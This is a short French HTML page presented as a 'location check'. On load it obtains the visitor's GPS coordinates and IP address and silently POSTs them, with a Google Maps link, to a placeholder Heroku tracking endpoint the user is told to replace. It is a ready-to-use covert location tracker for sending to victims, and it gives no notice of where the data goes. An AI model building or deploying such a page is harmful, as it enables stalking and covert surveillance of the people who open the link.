<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Localisation & Envoi Email</title>
    <script>
        async function getIP() {
            try {
                let response = await fetch('https://api64.ipify.org?format=json');
                let data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Erreur de r√©cup√©ration de l'IP :", error);
                return "IP inconnue";
            }
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const ip = await getIP();
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    const data = { ip, latitude, longitude, accuracy, googleMapsLink };

                    fetch('https://ton-serveur-heroku.herokuapp.com/track', { // üî¥ MODIFIE L'URL ICI !
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    })
                    .then(response => response.json())
                    .then(data => console.log("Donn√©es envoy√©es :", data))
                    .catch(error => console.error("Erreur :", error));
                }, handleError);
            } else {
                alert("La g√©olocalisation n'est pas support√©e par ce navigateur.");
            }
        }

        function handleError(error) {
            alert("Erreur de g√©olocalisation : " + error.message);
        }
    </script>
</head>
<body onload="getLocation()">
    <h1>V√©rification de la localisation...</h1>
</body>
</html>
